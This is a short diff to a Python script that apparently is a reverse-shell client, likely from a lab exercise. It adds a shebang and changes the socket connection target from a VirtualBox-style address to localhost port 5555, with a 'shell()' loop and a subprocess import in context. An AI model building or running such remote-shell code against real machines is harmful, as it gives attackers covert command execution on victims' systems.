@@ -1,3 +1,5 @@
+#! /usr/bin/python
+
 import socket
 import json
 import subprocess
@@ -16,7 +18,7 @@ def reliable_recieve():
             continue
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.0.2.15", 5555))
+s.connect(("127.0.0.1", 5555))
 
 def shell():
     while True:
